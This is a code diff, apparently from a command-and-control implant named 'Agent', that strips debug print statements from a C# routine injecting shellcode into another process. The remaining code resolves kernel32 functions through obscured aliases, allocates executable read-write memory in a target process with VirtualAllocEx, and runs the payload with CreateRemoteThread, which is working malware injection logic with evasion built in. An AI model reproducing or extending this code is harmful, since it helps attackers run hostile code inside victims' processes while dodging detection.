@@ -37,14 +37,12 @@ namespace Agent
 
             if (!Resolver.ResolveFuncs(resolveFuncs, "k32"))
             {
-                Console.WriteLine(41);
                 return false;
             }
 
             //VirtualAllocEx
             object[] vaeParams = new object[] { target, IntPtr.Zero, (UInt32)shellcode.Length, Native.AllocationType.Commit | Native.AllocationType.Reserve, Native.MemoryProtection.PAGE_EXECUTE_READWRITE };
             IntPtr pAddr = Generic.InvokeFunc<IntPtr>(Resolver.GetFunc("vae"), typeof(VirtAllocExDelegate), ref vaeParams);
-            Console.WriteLine("47");
             if (pAddr == IntPtr.Zero)
             {
                 return false;
@@ -57,17 +55,14 @@ namespace Agent
             {
                 return false;
             }
-            Console.WriteLine("60");
             //CreateRemoteThread
             IntPtr hThreadId = IntPtr.Zero;
             object[] crtParams = new object[] { target, IntPtr.Zero, (UInt32)0, pAddr, IntPtr.Zero, Native.ThreadCreationFlags.NORMAL, hThreadId };
             IntPtr hThread = Generic.InvokeFunc<nint>(Resolver.GetFunc("crt"), typeof(CrtDelegate), ref crtParams);
-            Console.WriteLine("65");
             if (hThread == IntPtr.Zero)
             {
                 return false;
             }
-            Console.WriteLine("70");
             return true;
         }
     }
